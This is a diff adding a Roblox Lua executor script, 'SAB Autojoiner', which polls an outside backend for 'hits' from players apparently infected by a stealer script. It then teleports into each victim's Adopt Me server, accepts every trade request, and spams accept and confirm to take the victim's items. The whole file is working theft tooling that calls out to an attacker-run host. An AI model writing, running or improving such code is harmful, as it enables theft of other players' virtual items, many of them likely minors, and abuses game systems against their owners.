@@ -1,0 +1,357 @@
+-- discord.gg/syncrypt | SAB Autojoiner Integration
+
+local function geniter(f, s, c)
+	if type(f) ~= "function" then
+		local mt = getmetatable(f)
+		if type(mt) == "table" and mt.__iter then
+			f, s, c = mt.__iter(f)
+		elseif type(f) == "table" then
+			f, s, c = next, f, nil
+		end
+	end
+	return function()
+		local r = table.pack(f(s, c))
+		if r[1] == nil then return false end
+		c = r[1]
+		return true, table.unpack(r, 1, r.n)
+	end
+end
+
+getgenv().vega_sab_executed = getgenv().vega_sab_executed or false
+if getgenv().vega_sab_executed then return end
+getgenv().vega_sab_executed = true
+
+-- ─── CONFIG ───────────────────────────────────────────────────────────────────
+local VPS_URL     = "https://sab-backend.snthnova.workers.dev"
+local VPS_API_KEY = "sabapi_secret_key"
+local PLACE_ID    = 920587237   -- Adopt Me
+-- ──────────────────────────────────────────────────────────────────────────────
+
+local Players         = game:GetService("Players")
+local HttpService     = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local UserInputService= game:GetService("UserInputService")
+local VirtualUser     = game:GetService("VirtualUser")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+
+local LocalPlayer = Players.LocalPlayer
+local request_ = request or http_request or syn.request or http.request
+
+-- ─── ANTI-IDLE ────────────────────────────────────────────────────────────────
+Players.LocalPlayer.Idled:connect(function()
+	VirtualUser:CaptureController()
+	VirtualUser:ClickButton2(Vector2.new())
+end)
+
+-- ─── PERSISTENT FILES ─────────────────────────────────────────────────────────
+if not isfile("sab_joined.txt") then writefile("sab_joined.txt", "[]") end
+if not isfile("sab_target.txt") then writefile("sab_target.txt", "") end
+
+local joinedData = HttpService:JSONDecode(readfile("sab_joined.txt"))
+local targetName = readfile("sab_target.txt")
+
+local function markJoined(id)
+	table.insert(joinedData, tostring(id))
+	writefile("sab_joined.txt", HttpService:JSONEncode(joinedData))
+end
+
+-- ─── UI ───────────────────────────────────────────────────────────────────────
+local CoreGui = pcall(function() return game:GetService("CoreGui") end)
+	and game:GetService("CoreGui") or LocalPlayer:WaitForChild("PlayerGui")
+
+for _, c in pairs(CoreGui:GetChildren()) do
+	if c.Name == "SAB_AutoJoiner" then c:Destroy() end
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name           = "SAB_AutoJoiner"
+ScreenGui.ResetOnSpawn   = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.Parent         = CoreGui
+
+local Frame = Instance.new("Frame")
+Frame.Name              = "Main"
+Frame.Size              = UDim2.new(0, 230, 0, 145)
+Frame.Position          = UDim2.new(1, -250, 0.5, -72)
+Frame.BackgroundColor3  = Color3.fromRGB(12, 12, 12)
+Frame.BorderSizePixel   = 0
+Frame.Parent            = ScreenGui
+Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 7)
+
+local stroke = Instance.new("UIStroke", Frame)
+stroke.Color            = Color3.fromRGB(55, 55, 55)
+stroke.Thickness        = 1
+stroke.ApplyStrokeMode  = Enum.ApplyStrokeMode.Border
+
+local TopBar = Instance.new("Frame", Frame)
+TopBar.Name             = "TopBar"
+TopBar.Size             = UDim2.new(1, 0, 0, 36)
+TopBar.BackgroundTransparency = 1
+
+local Title = Instance.new("TextLabel", TopBar)
+Title.Size              = UDim2.new(1, -16, 1, 0)
+Title.Position          = UDim2.new(0, 14, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text              = "SAB · AUTOJOINER"
+Title.Font              = Enum.Font.GothamBlack
+Title.TextSize          = 11
+Title.TextColor3        = Color3.fromRGB(255,255,255)
+Title.TextXAlignment    = Enum.TextXAlignment.Left
+
+local Divider = Instance.new("Frame", Frame)
+Divider.Size            = UDim2.new(1, -28, 0, 1)
+Divider.Position        = UDim2.new(0, 14, 0, 36)
+Divider.BackgroundColor3= Color3.fromRGB(55,55,55)
+Divider.BorderSizePixel = 0
+
+local Body = Instance.new("Frame", Frame)
+Body.Size               = UDim2.new(1, -28, 1, -48)
+Body.Position           = UDim2.new(0, 14, 0, 46)
+Body.BackgroundTransparency = 1
+Instance.new("UIListLayout", Body).Padding = UDim.new(0, 7)
+
+local function mkLabel(txt, order)
+	local lbl = Instance.new("TextLabel", Body)
+	lbl.Size            = UDim2.new(1, 0, 0, 15)
+	lbl.BackgroundTransparency = 1
+	lbl.Text            = txt
+	lbl.Font            = Enum.Font.RobotoMono
+	lbl.TextSize        = 11
+	lbl.TextColor3      = Color3.fromRGB(195,195,195)
+	lbl.TextXAlignment  = Enum.TextXAlignment.Left
+	lbl.LayoutOrder     = order
+	return lbl
+end
+
+local lblTarget  = mkLabel("Target :: —", 1)
+local lblLeft    = mkLabel("Left   :: —", 2)
+local lblValue   = mkLabel("Value  :: —", 3)
+
+-- status dot + label
+local DotRow = Instance.new("Frame", Body)
+DotRow.Size             = UDim2.new(1, 0, 0, 15)
+DotRow.BackgroundTransparency = 1
+DotRow.LayoutOrder      = 4
+
+local Dot = Instance.new("Frame", DotRow)
+Dot.Size                = UDim2.new(0, 8, 0, 8)
+Dot.Position            = UDim2.new(0, 0, 0.5, -4)
+Dot.BackgroundColor3    = Color3.fromRGB(255,170,0)
+Instance.new("UICorner", Dot).CornerRadius = UDim.new(1, 0)
+
+local lblStatus = Instance.new("TextLabel", DotRow)
+lblStatus.Size          = UDim2.new(1, -16, 1, 0)
+lblStatus.Position      = UDim2.new(0, 14, 0, 0)
+lblStatus.BackgroundTransparency = 1
+lblStatus.Text          = "Status :: Idle"
+lblStatus.Font          = Enum.Font.RobotoMono
+lblStatus.TextSize      = 11
+lblStatus.TextColor3    = Color3.fromRGB(195,195,195)
+lblStatus.TextXAlignment= Enum.TextXAlignment.Left
+
+-- draggable
+local dragging, dragInput, dragStart, startPos
+TopBar.InputBegan:Connect(function(inp)
+	if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart  = inp.Position
+		startPos   = Frame.Position
+		inp.Changed:Connect(function()
+			if inp.UserInputState == Enum.UserInputState.End then dragging = false end
+		end)
+	end
+end)
+TopBar.InputChanged:Connect(function(inp)
+	if inp.UserInputType == Enum.UserInputType.MouseMovement then dragInput = inp end
+end)
+UserInputService.InputChanged:Connect(function(inp)
+	if inp == dragInput and dragging then
+		local d = inp.Position - dragStart
+		Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X,
+		                           startPos.Y.Scale, startPos.Y.Offset + d.Y)
+	end
+end)
+
+-- ─── STATUS HELPERS ───────────────────────────────────────────────────────────
+local COLORS = {
+	WAIT  = Color3.fromRGB(255,170,0),
+	GO    = Color3.fromRGB(40,255,100),
+	ERR   = Color3.fromRGB(255,40,40),
+}
+local function setStatus(msg, col)
+	lblStatus.Text          = "Status :: " .. msg
+	Dot.BackgroundColor3    = col or COLORS.WAIT
+end
+
+-- ─── TARGET LEFT TRACKING ─────────────────────────────────────────────────────
+local targetLeft = (targetName == "" or targetName == LocalPlayer.Name
+                    or not Players:FindFirstChild(targetName))
+
+Players.PlayerRemoving:Connect(function(p)
+	if p.Name == targetName then targetLeft = true end
+end)
+
+-- ─── POLL SAB BACKEND FOR HITS ────────────────────────────────────────────────
+--  SAB posts: { jobId, placeId, username, receivers[], totalValue, itemCount }
+--  We GET /hits and look for entries where receivers contains our name.
+local idleCount = 0
+
+local function pollAndJoin()
+	setStatus("Listening...", COLORS.WAIT)
+
+	-- only teleport when target has left (or never set) and we've been idle a bit
+	if not targetLeft and idleCount < 10 then return end
+
+	local ok, res = pcall(function()
+		return request_({
+			Url     = VPS_URL .. "/hits",
+			Method  = "GET",
+			Headers = {
+				["x-api-key"] = VPS_API_KEY
+			}
+		})
+	end)
+
+	if not (ok and res and res.Success) then
+		setStatus("Poll error", COLORS.ERR)
+		return
+	end
+
+	local hits
+	ok, hits = pcall(function() return HttpService:JSONDecode(res.Body) end)
+	if not ok or type(hits) ~= "table" then
+		setStatus("Parse error", COLORS.ERR)
+		return
+	end
+
+	for _, hit in ipairs(hits) do
+		-- must be for this receiver
+		local isReceiver = false
+		if type(hit.receivers) == "table" then
+			for _, r in ipairs(hit.receivers) do
+				if tostring(r):lower() == LocalPlayer.Name:lower() then
+					isReceiver = true
+					break
+				end
+			end
+		end
+
+		if not isReceiver then continue end
+		if table.find(joinedData, tostring(hit.id)) then continue end
+		-- respect placeId if set
+		if hit.placeId and hit.placeId ~= 0 and hit.placeId ~= game.PlaceId then continue end
+
+		local jobId   = hit.jobId
+		local victim  = hit.username or "?"
+		local val     = hit.totalValue or 0
+
+		lblTarget.Text = "Target :: " .. victim
+		lblValue.Text  = "Value  :: " .. string.format("%.1f", val)
+		setStatus("Hit found — teleporting", COLORS.GO)
+
+		-- try up to 3 times
+		for attempt = 1, 3 do
+			setStatus(string.format("Teleport %d/3", attempt), COLORS.GO)
+			local tpOk = pcall(function()
+				TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, LocalPlayer)
+			end)
+			if tpOk then
+				markJoined(tostring(hit.id))
+				writefile("sab_target.txt", victim)
+				targetName  = victim
+				targetLeft  = false
+				return
+			end
+			if attempt < 3 then task.wait(3) end
+		end
+
+		setStatus("Teleport failed", COLORS.ERR)
+	end
+end
+
+-- ─── ADOPT ME — RECEIVE TRADES FROM SAB-INFECTED VICTIM ──────────────────────
+if game.PlaceId == PLACE_ID then
+	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+	local AssetLoadUI = PlayerGui:WaitForChild("AssetLoadUI")
+	while AssetLoadUI.Enabled do task.wait(1) end
+	task.wait(10)   -- let the game settle
+
+	local RouterClient       = require(game.ReplicatedStorage.Fsys).load("RouterClient")
+	local AcceptOrDecline    = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+	local AddItemToOffer     = RouterClient.get("TradeAPI/AddItemToOffer")
+	local AcceptNegotiation  = RouterClient.get("TradeAPI/AcceptNegotiation")
+	local ConfirmTrade       = RouterClient.get("TradeAPI/ConfirmTrade")
+	local TradeFrame         = PlayerGui.TradeApp.Frame
+
+	-- Accept EVERY incoming trade request unconditionally
+	RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
+		-- accept from anyone (SAB victim will be one of them)
+		local ok = pcall(function()
+			AcceptOrDecline:InvokeServer(sender, true)
+		end)
+		if not ok then
+			-- fallback: some versions expose a different signature
+			pcall(function() AcceptOrDecline:FireServer(sender, true) end)
+		end
+	end)
+
+	-- Once trade window is open: throw in a food item (shows good faith), spam accept
+	local offered = false
+	task.spawn(function()
+		while task.wait(0.1) do
+			if TradeFrame.Visible then
+				if not offered then
+					-- offer any food from inventory so the trade isn't empty
+					pcall(function()
+						local inv = require(game.ReplicatedStorage.Fsys)
+							.load("RouterClient")
+							.get("DataAPI/GetAllServerData")
+						-- just fire AddItemToOffer with the first food uid we can find
+						local data = inv and game:GetService("ReplicatedStorage")
+							:FindFirstChild("Fsys") and
+							require(game.ReplicatedStorage.Fsys)
+							.load("ClientData").get("inventory")
+						if data and data.food then
+							for uid, _ in pairs(data.food) do
+								pcall(function() AddItemToOffer:FireServer(uid) end)
+								break
+							end
+						end
+					end)
+					offered = true
+				end
+				pcall(function() AcceptNegotiation:FireServer() end)
+			else
+				offered = false
+			end
+		end
+	end)
+
+	-- Spam ConfirmTrade while window open
+	task.spawn(function()
+		while task.wait(0.08) do
+			if TradeFrame.Visible and offered then
+				pcall(function() ConfirmTrade:FireServer() end)
+			end
+		end
+	end)
+
+	-- Track idle time (trade window closed = no active trade)
+	task.spawn(function()
+		while task.wait(1) do
+			if TradeFrame.Visible then
+				idleCount = 0
+			else
+				idleCount = idleCount + 1
+				offered   = false
+			end
+			-- update left label
+			lblLeft.Text = "Left   :: " .. (targetLeft and "True" or "False")
+		end
+	end)
+
+	-- Main polling loop
+	while task.wait(5) do
+		pollAndJoin()
+	end
+end
